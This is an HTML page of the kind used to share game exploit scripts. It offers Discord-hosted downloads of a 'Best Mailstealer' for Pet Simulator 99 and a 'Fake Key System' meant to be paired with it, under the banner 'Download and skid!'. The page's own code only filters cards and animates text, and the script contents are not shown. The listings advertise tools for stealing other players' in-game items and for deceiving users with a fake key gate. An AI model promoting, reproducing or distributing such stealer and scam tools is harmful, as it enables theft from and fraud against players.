<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lua Scripts</title>
    <style>
        body {
            background-color: #121212;
            color: #e0e0e0;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            text-align: center;
        }
        .container {
            width: 60%;
            max-width: 800px;
            margin: 0 auto;
        }
        .typewriter-container {
            margin-bottom: 20px;
            font-size: 24px;
        }
        .search-bar {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #333;
            border-radius: 5px;
            background: #1e1e1e;
            color: #e0e0e0;
            font-size: 16px;
        }
        .card {
            background: #1e1e1e;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            transition: transform 0.3s, box-shadow 0.3s;
            border: 1px solid #333;
        }
        .card:hover {
            transform: translateY(-10px);
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
        }
        .card h2 {
            margin: 0 0 10px;
        }
        .card p {
            margin: 0 0 20px;
        }
        .download-button {
            display: inline-block;
            padding: 10px 20px;
            color: #e0e0e0;
            background: #333;
            border: 1px solid #fff;
            border-radius: 5px;
            text-decoration: none;
            transition: background 0.3s, transform 0.3s, box-shadow 0.3s;
        }
        .download-button:hover {
            background: #444;
            transform: scale(1.1);
            box-shadow: 0 0 10px 2px rgba(255, 255, 255, 0.8);
        }
    </style>
    <!-- Include Typewriter.js from CDN -->
    <script src="https://cdn.jsdelivr.net/npm/typewriter-effect@latest/dist/core.js"></script>
</head>
<body>
    <div class="container">
        <div class="typewriter-container">
            <div id="typewriter"></div>
        </div>
        <input type="text" class="search-bar" placeholder="Search scripts..." onkeyup="filterCards()">
        <div class="card" data-title="Best Mailstealer">
            <h2>Best Mailstealer</h2>
            <p>Best Pet Simulator 99 Script.</p>
            <a href="https://cdn.discordapp.com/attachments/1234931860631457803/1241477684765261924/gg.H3hAhSgAAQ.txt?ex=664a57b1&is=66490631&hm=9b83a2e83fcfc9bd46d8f42e5fa24f3a60cec4c04d6cc210ca47aa292a234496&" class="download-button">Download Script</a>
        </div>
        <div class="card" data-title="Fake Key System">
            <h2>Fake Key System</h2>
            <p>Recomended to be used with the mailstealer above.</p>
            <a href="https://cdn.discordapp.com/attachments/1234931860631457803/1241478310492504154/gg.tNMpbXGMaK.txt?ex=664a5846&is=664906c6&hm=b8a749ad4970ab4c1b9d733e7f625e85b5f57b66f18ba503a24917934245edb6&" class="download-button">Download Script</a>
        </div>
    </div>
    <script>
        function filterCards() {
            const searchInput = document.querySelector('.search-bar').value.toLowerCase();
            const cards = document.querySelectorAll('.card');

            cards.forEach(card => {
                const title = card.getAttribute('data-title').toLowerCase();
                if (title.includes(searchInput)) {
                    card.style.display = 'block';
                } else {
                    card.style.display = 'none';
                }
            });
        }

        // Initialize Typewriter.js
        const typewriter = new Typewriter('#typewriter', {
            loop: true
        });

            typewriter.typeString('Find the best opensourced scripts here.')
            .pauseFor(50)
            .deleteAll()
            .typeString('Download and skid!')
            .pauseFor(50)
            .start();
    </script>
</body>
</html>
